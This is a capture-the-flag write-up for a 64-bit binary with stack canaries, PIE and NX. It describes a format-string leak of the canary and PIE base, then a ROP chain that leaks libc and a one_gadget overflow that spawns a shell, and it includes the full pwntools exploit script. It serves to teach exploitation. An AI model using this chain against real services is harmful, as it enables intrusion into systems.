# Not So Easy B0f

> I have stack canaries enabled, Can you still B0f me ?
>
> Service : nc 68.183.158.95 8991
>
> [q3](q3)

The given binary has all typical security mechanisms enabled:

		$ checksec q3
	    Arch:     amd64-64-little
	    RELRO:    Full RELRO
	    Stack:    Canary found
	    NX:       NX enabled
	    PIE:      PIE enabled

The binary lets us enter our name and greets us by directly printing out our input via `printf`! Afterwards it lets us read 0x100 bytes into a 16 bytes buffer, so we can overflow the buffer and get code execution, if we get the canary value.

Thanks to `printf` we can specify a format string to read out the canary value from the stack. Additionally since `PIE` is enabled we can also read the `RBP` value to get the `PIE` offset.

With having these values we can now go on and build a `ROP` chain to leak the `libc` base address by setting up a `puts` call that prints its actual address from the `GOT`. Then we call the `main` function again to have another turn to input something.

Now with having the `libc` base address, we overflow the buffer and directly jump to `one_gadget` that spawns the shell.

Exploit code:

```python
from pwn import *


libc = ELF('/usr/lib/libc.so.6')
e = ELF('./q3')


p = process('./q3')
# context.terminal = ['termite', '-e']
# p = gdb.debug('./q3')

p.sendline('%11$llx%12$llx')
p.recvuntil('Hello\n')

canary = int(p.recv(16), 16)
log.success('canary: {}'.format(hex(canary)))

pie_base = int(p.recv(12), 16) - 0x830
log.success('pie_base: {}'.format(hex(pie_base)))

ret = pie_base + 0x60e
pop_rdi_ret = pie_base + 0x893

p.sendline('A' * 24  + p64(canary) + p64(0x0) + p64(pop_rdi_ret) + p64(pie_base + e.got['puts']) + p64(pie_base + e.plt['puts']) + p64(pie_base + e.symbols['main']))
p.recvuntil(': ')

leak = u64(p.recvline()[:-1]+'\x00\x00')
libc_base = leak - libc.symbols['puts']

log.success('libc_base: {}'.format(hex(libc_base)))

one_gadget = libc_base + 0xeafab

p.sendline('0wn3d :))')
p.sendline('A' * 24 + p64(canary) + p64(0x0) + p64(ret) + p64(one_gadget))
p.interactive()
```